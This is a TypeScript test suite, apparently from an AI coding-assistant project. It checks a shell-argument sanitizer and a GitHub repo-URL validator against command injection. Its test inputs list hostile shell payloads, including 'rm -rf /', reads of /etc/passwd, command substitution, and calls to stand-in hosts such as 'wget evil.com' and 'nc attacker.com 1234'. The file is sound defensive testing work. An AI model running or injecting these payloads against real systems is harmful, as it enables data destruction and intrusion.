import { execSync } from "child_process";
import { describe, expect, it } from "vitest";
import { normalizeRepoUrl } from "./repoUrl";
import { sanitizeShellArgument, validateGitHubRepoUrl } from "./sanitization";

describe("sanitizeShellArgument", () => {
  it("should escape shell metacharacters", () => {
    const dangerous = [
      "; rm -rf /",
      "&& cat /etc/passwd",
      "|| wget evil.com",
      "| nc attacker.com 1234",
      "`whoami`",
      "$(whoami)",
      "$HOME/evil",
    ];

    dangerous.forEach((input) => {
      const result = sanitizeShellArgument(input);
      expect(result).toBeDefined();
      expect(typeof result).toBe("string");
      // shell-quote should properly escape these
      expect(result).not.toBe(input);
    });
  });

  it("should handle safe strings", () => {
    const safe = ["agent-123", "my-agent", "simple-message"];
    safe.forEach((input) => {
      const result = sanitizeShellArgument(input);
      expect(result).toBeDefined();
      expect(typeof result).toBe("string");
    });
  });

  it("should handle special characters", () => {
    const result = sanitizeShellArgument("agent with spaces");
    expect(result).toBeDefined();
    expect(typeof result).toBe("string");
  });

  it("should handle empty string", () => {
    const result = sanitizeShellArgument("");
    expect(result).toBeDefined();
  });
});

describe("validateGitHubRepoUrl", () => {
  it("should accept valid repository names", () => {
    expect(validateGitHubRepoUrl("continuedev/continue")).toBe(true);
    expect(validateGitHubRepoUrl("owner/repo")).toBe(true);
    expect(validateGitHubRepoUrl("owner-name/repo-name")).toBe(true);
    expect(validateGitHubRepoUrl("https://github.com/owner/repo")).toBe(true);
    expect(validateGitHubRepoUrl("git@github.com:owner/repo.git")).toBe(true);
  });

  it("should reject path traversal", () => {
    expect(validateGitHubRepoUrl("../../../etc/passwd")).toBe(false);
    expect(validateGitHubRepoUrl("owner/../evil")).toBe(false);
  });

  it("should reject command injection attempts", () => {
    expect(validateGitHubRepoUrl("owner/repo; rm -rf /")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo && cat /etc/passwd")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo || wget evil.com")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo | nc attacker")).toBe(false);
  });

  it("should reject shell metacharacters", () => {
    expect(validateGitHubRepoUrl("owner/$(whoami)")).toBe(false);
    expect(validateGitHubRepoUrl("owner/`whoami`")).toBe(false);
    expect(validateGitHubRepoUrl("$EVIL/repo")).toBe(false);
  });

  it("should reject shell redirection", () => {
    expect(validateGitHubRepoUrl("owner/repo > /dev/null")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo < /etc/passwd")).toBe(false);
  });

  it("should reject newlines", () => {
    expect(validateGitHubRepoUrl("owner/repo\nrm -rf /")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo\rrm -rf /")).toBe(false);
  });

  it("should reject empty or invalid input", () => {
    expect(validateGitHubRepoUrl("")).toBe(false);
    expect(validateGitHubRepoUrl("   ")).toBe(false);
    expect(validateGitHubRepoUrl(null as any)).toBe(false);
    expect(validateGitHubRepoUrl(undefined as any)).toBe(false);
  });

  describe("validation after normalization", () => {
    it("should validate normalized URLs to prevent bypass", () => {
      // Test that validation works on normalized output
      const inputs = [
        "owner/repo",
        "git@github.com:owner/repo.git",
        "https://github.com/owner/repo.git",
        "ssh://git@github.com/owner/repo.git",
      ];

      inputs.forEach((input) => {
        const normalized = normalizeRepoUrl(input);
        expect(validateGitHubRepoUrl(normalized)).toBe(true);
      });
    });

    it("should catch dangerous URLs even after normalization", () => {
      // These should still be dangerous after normalization
      const dangerous = [
        "owner/repo; rm -rf /",
        "owner/repo && malicious",
        "owner/repo | cat /etc/passwd",
      ];

      dangerous.forEach((input) => {
        // Should be blocked before normalization
        expect(validateGitHubRepoUrl(input)).toBe(false);

        // Even if somehow normalized, should still be invalid
        const normalized = normalizeRepoUrl(input);
        expect(validateGitHubRepoUrl(normalized)).toBe(false);
      });
    });

    it("should handle edge cases where normalization changes URL structure", () => {
      // Test URLs that change during normalization
      const testCases = [
        {
          input: "Owner/Repo.git/",
          normalized: "https://github.com/owner/repo",
          shouldBeValid: true,
        },
        {
          input: "git@github.com:owner/repo.git",
          normalized: "https://github.com/owner/repo",
          shouldBeValid: true,
        },
      ];

      testCases.forEach(({ input, normalized, shouldBeValid }) => {
        const actualNormalized = normalizeRepoUrl(input);
        expect(actualNormalized).toBe(normalized);
        expect(validateGitHubRepoUrl(actualNormalized)).toBe(shouldBeValid);
      });
    });

    it("should prevent validation bypass via URL encoding or special chars", () => {
      // These tests ensure that validation happens AFTER normalization
      // preventing attackers from bypassing validation via encoding or transformation

      // Currently validateGitHubRepoUrl blocks these, but this test ensures
      // the pattern of "normalize then validate" is maintained
      const potentialBypass = [
        "../../../etc/passwd",
        "owner/../malicious",
        "owner/repo`whoami`",
        "owner/repo$(whoami)",
      ];

      potentialBypass.forEach((input) => {
        expect(validateGitHubRepoUrl(input)).toBe(false);
      });
    });
  });
});

/**
 * Integration tests for sanitizeShellArgument
 *
 * These tests actually execute shell commands with sanitized dangerous inputs
 * to verify end-to-end that the sanitization prevents injection attacks.
 *
 * IMPORTANT: These are CRITICAL security tests. The unit tests above verify
 * that sanitization transforms inputs, but only these integration tests prove
 * that the transformed output is safe when executed in a real shell.
 */
describe("sanitizeShellArgument - integration tests", () => {
  // Helper function to safely execute a command with a timeout
  const safeExec = (command: string): string => {
    try {
      return execSync(command, {
        encoding: "utf-8",
        timeout: 5000, // 5 second timeout to prevent hanging
        shell: "/bin/sh", // Use standard POSIX shell
      }).trim();
    } catch (error: any) {
      // If command fails (non-zero exit), return the error output
      return error.stdout?.trim() || "";
    }
  };

  it("should prevent command injection with semicolon separator", () => {
    const malicious = "; echo INJECTED";
    const sanitized = sanitizeShellArgument(malicious);

    // Execute echo command with the sanitized input
    const result = safeExec(`echo ${sanitized}`);

    // The output should be the literal string, not execute "echo INJECTED"
    expect(result).toBe(malicious);
    expect(result).not.toBe("INJECTED");
  });

  it("should prevent command injection with && operator", () => {
    const malicious = "safe && echo INJECTED";
    const sanitized = sanitizeShellArgument(malicious);

    const result = safeExec(`echo ${sanitized}`);

    // Should output the literal string, not execute the injected command
    // The string "INJECTED" will appear, but as part of "echo INJECTED" literal text
    expect(result).toBe(malicious);
    expect(result).toContain("echo INJECTED"); // Verify it's the literal command text
  });

  it("should prevent command injection with || operator", () => {
    const malicious = "safe || echo INJECTED";
    const sanitized = sanitizeShellArgument(malicious);

    const result = safeExec(`echo ${sanitized}`);

    // Should output the literal string, not execute the injected command
    expect(result).toBe(malicious);
    expect(result).toContain("echo INJECTED"); // Verify it's the literal command text
  });

  it("should prevent command injection with pipe operator", () => {
    const malicious = "safe | echo INJECTED";
    const sanitized = sanitizeShellArgument(malicious);

    const result = safeExec(`echo ${sanitized}`);

    expect(result).toBe(malicious);
  });

  it("should prevent command substitution with $()", () => {
    const malicious = "$(echo INJECTED)";
    const sanitized = sanitizeShellArgument(malicious);

    const result = safeExec(`echo ${sanitized}`);

    // Should output the literal string "$(echo INJECTED)", not "INJECTED"
    expect(result).toBe(malicious);
    expect(result).not.toBe("INJECTED");
  });

  it("should prevent command substitution with backticks", () => {
    const malicious = "`echo INJECTED`";
    const sanitized = sanitizeShellArgument(malicious);

    const result = safeExec(`echo ${sanitized}`);

    // Should output the literal backtick string, not execute it
    expect(result).toBe(malicious);
    expect(result).not.toBe("INJECTED");
  });

  it("should prevent variable expansion", () => {
    // Set an environment variable for this test
    process.env.TEST_VAR = "EXPANDED";

    const malicious = "$TEST_VAR";
    const sanitized = sanitizeShellArgument(malicious);

    const result = safeExec(`echo ${sanitized}`);

    // Should output literal "$TEST_VAR", not "EXPANDED"
    expect(result).toBe(malicious);
    expect(result).not.toBe("EXPANDED");

    // Cleanup
    delete process.env.TEST_VAR;
  });

  it("should handle git stash message use case safely", () => {
    // This mirrors the actual usage in VsCodeMessenger.ts:269
    const agentId = "agent-123; rm -rf /";
    const stashMessage = `Continue: Stashed before opening agent ${agentId}`;
    const sanitized = sanitizeShellArgument(stashMessage);

    // Simulate the git stash command (using echo as a safe substitute)
    // In real code: `git stash push -m ${sanitized}`
    const result = safeExec(`echo ${sanitized}`);

    // The message should contain the full literal string including dangerous chars
    expect(result).toContain("agent-123; rm -rf /");
    expect(result).toContain("Continue: Stashed before opening agent");
    // Verify it's one line (not executed as multiple commands)
    expect(result.split("\n").length).toBe(1);
  });

  it("should handle multi-line injection attempts", () => {
    const malicious = "line1\necho INJECTED\nline3";
    const sanitized = sanitizeShellArgument(malicious);

    const result = safeExec(`echo ${sanitized}`);

    // Should preserve the structure but not execute embedded commands
    expect(result).toContain("line1");
    expect(result).toContain("line3");
    // The literal "echo INJECTED" text should appear, but not executed
    expect(result).toContain("echo INJECTED");
  });

  it("should handle shell redirection attempts", () => {
    const malicious = "message > /tmp/test.txt";
    const sanitized = sanitizeShellArgument(malicious);

    const result = safeExec(`echo ${sanitized}`);

    // Should output the literal string, not create a file
    expect(result).toBe(malicious);
    // The command should not have created the file
    // (we're not checking file system to keep test isolated)
  });

  it("should handle complex injection with multiple attack vectors", () => {
    const malicious = "; $(whoami) && `date` || $HOME | cat > /dev/null";
    const sanitized = sanitizeShellArgument(malicious);

    const result = safeExec(`echo ${sanitized}`);

    // Should output the entire literal string
    expect(result).toBe(malicious);
    // Verify none of the commands were executed by checking output is literal
    expect(result).toContain("$(whoami)");
    expect(result).toContain("`date`");
    expect(result).toContain("$HOME");
  });

  it("should handle special characters safely", () => {
    const special = 'test with spaces, quotes\', and "more"';
    const sanitized = sanitizeShellArgument(special);

    const result = safeExec(`echo ${sanitized}`);

    expect(result).toBe(special);
  });

  it("should handle empty string without errors", () => {
    const sanitized = sanitizeShellArgument("");

    // Should not throw when used in a command
    expect(() => safeExec(`echo ${sanitized}`)).not.toThrow();
  });

  it("should verify shell-quote properly escapes for git log format strings", () => {
    // Another common use case: git log with custom format strings
    const userInput = "Author: $(whoami) Date: `date`";
    const sanitized = sanitizeShellArgument(userInput);

    // Simulate: git log --format="%s: ${sanitized}"
    // Using printf as a safer test substitute
    const result = safeExec(`printf '%s' ${sanitized}`);

    // Should output the literal string, not execute substitutions
    expect(result).toBe(userInput);
    expect(result).toContain("$(whoami)");
    expect(result).toContain("`date`");
  });
});
